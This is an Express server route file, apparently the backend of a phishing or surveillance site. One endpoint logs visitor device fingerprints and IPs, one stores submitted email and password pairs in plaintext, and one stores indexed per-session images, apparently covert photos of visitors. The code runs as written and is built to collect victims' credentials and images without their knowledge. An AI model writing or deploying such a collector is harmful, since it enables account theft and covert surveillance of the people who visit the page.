import { Router, type IRouter } from "express";
import { db } from "@workspace/db";
import { visitorsTable, photosTable, credentialsTable } from "@workspace/db/schema";
import { randomUUID } from "crypto";

const router: IRouter = Router();

router.post("/track/info", async (req, res) => {
  try {
    const body = req.body;
    const sessionId = body.sessionId || randomUUID();
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.socket.remoteAddress ||
      "unknown";

    await db.insert(visitorsTable).values({
      sessionId,
      userAgent: body.userAgent || null,
      language: body.language || null,
      platform: body.platform || null,
      screenWidth: body.screenWidth || null,
      screenHeight: body.screenHeight || null,
      timezone: body.timezone || null,
      referrer: body.referrer || null,
      ip,
    });

    res.json({ success: true, sessionId });
  } catch (err) {
    req.log.error({ err }, "Error saving visitor info");
    res.status(500).json({ success: false, sessionId: "" });
  }
});

router.post("/track/credentials", async (req, res) => {
  try {
    const { sessionId, email, password } = req.body;
    if (!sessionId || !email || !password) {
      res.status(400).json({ success: false, sessionId: "" });
      return;
    }
    await db.insert(credentialsTable).values({ sessionId, email, password });
    res.json({ success: true, sessionId });
  } catch (err) {
    req.log.error({ err }, "Error saving credentials");
    res.status(500).json({ success: false, sessionId: "" });
  }
});

router.post("/track/photo", async (req, res) => {
  try {
    const body = req.body;
    const { sessionId, photoIndex, imageData, timestamp: _ts } = body;

    if (!sessionId || photoIndex === undefined || !imageData) {
      res.status(400).json({ success: false, sessionId: "" });
      return;
    }

    await db.insert(photosTable).values({
      sessionId,
      photoIndex,
      imageData,
    });

    res.json({ success: true, sessionId });
  } catch (err) {
    req.log.error({ err }, "Error saving visitor photo");
    res.status(500).json({ success: false, sessionId: "" });
  }
});

export default router;
